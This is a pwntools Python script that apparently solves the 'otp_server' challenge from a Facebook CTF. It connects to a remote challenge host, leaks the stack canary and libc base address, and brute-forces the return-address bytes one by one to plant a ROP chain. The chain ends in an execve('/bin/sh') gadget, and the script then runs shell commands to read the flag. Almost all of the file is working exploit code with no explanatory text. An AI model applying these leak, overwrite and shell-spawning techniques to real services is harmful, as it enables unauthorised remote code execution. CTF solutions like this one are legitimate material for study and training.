from pwn import *
from pwn_debug.pwn_debug import *
# context.log_level = 'debug'

TARGET = "otp_server"
LIBC = "./libc-2.27.so"
elf = ELF(TARGET)
libc = ELF(LIBC) 

HOST = 'challenges3.fbctf.com'
PORT = 1338

pdbg = pwn_debug(TARGET)
pdbg.local(LIBC) 
# r = pdbg.run("local")
r = remote(HOST, PORT)

# bp, fork-mode, command
# pdbg.bp([0xbf1, 0xb7b, 0xc17,0xc0e, 0xd4b, 0xdbb, 0xd5c], 'parent', ['x/20gx $rax', 'vmmap'])
# pdbg.bp([0xd5c], 'parent', ['c'])

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))


r.sendlineafter('>>>', '1')
r.sendafter('key:', 'A'*0x108)

r.sendlineafter('>>>', '2')
r.sendafter('encrypt:', 'A' * 0x100)
r.recvuntil('\x00'+'A')
canary = u64(r.recv(8))
r.recv(8)
base = u64(r.recv(8)) - 0x21b97 
r.recv(8)
stack_target = u64(r.recv(8)) + 0x10  # should be null
dbg("canary")
dbg("base")
dbg("stack_target")

gadget = [
0x4f2c5, # execve("/bin/sh", rsp+0x40, environ) 
0x4f322, # execve("/bin/sh", rsp+0x40, environ) 
0x10a38c # execve("/bin/sh", rsp+0x70, environ)
] 

rdi = base + 0x2244e
rcx = base + 0x0003eb0b
write_rdi_rdx = base + 0x00176f83

# pop rdi 
# stack_target-0x60
# mov [rdi], 0
# pop rdi 
# stack_target
# mov [rdi], 0
# gadget
value = (base + gadget[2]) << 64*6 | (write_rdi_rdx) << 64*5 |stack_target << 64*4 | rdi <<64*3 |   (write_rdi_rdx) << 64*2 |(stack_target-0x60)<< 64 | rdi
# value = (base + gadget[1]) 
dbg("value")

for i in range(8*7):
    while(1):
        r.sendlineafter('>>>', '1')
        r.sendafter('key:', 'B'*(0x14+i)+'\x00') # 0x14 ~ 0x1c for ret
        r.sendlineafter('>>>', '2')
        r.sendafter('encrypt:', 'B'*0x100) 

        r.sendlineafter('>>>', '1')
        r.sendafter('key:', 'B' * 0x108) # 0x14 ~ 0x1c for ret
        r.sendlineafter('>>>', '2')
        r.sendafter('encrypt:', 'B'*0x100) 

        r.recvuntil('\x00'+'B')
        canary_check = u64(r.recv(8))
        r.recv(8)
        gadget_check = 0
        for j in range(7):
            gadget_check += u64(r.recv(8)) << (64*j)
        # dbg("canary_check")
        # dbg("gadget_check")
        print i, hex(gadget_check)
        if ((value >> (i*8)) & 0xff) == ((gadget_check >> (i*8)) & 0xff):
            break

r.sendlineafter('>>>', '3')
sleep(1)
r.sendline('ls')

sleep(1)
r.sendline('cd /home/otp*')

sleep(1)
r.sendline('cat f*')
r.interactive()

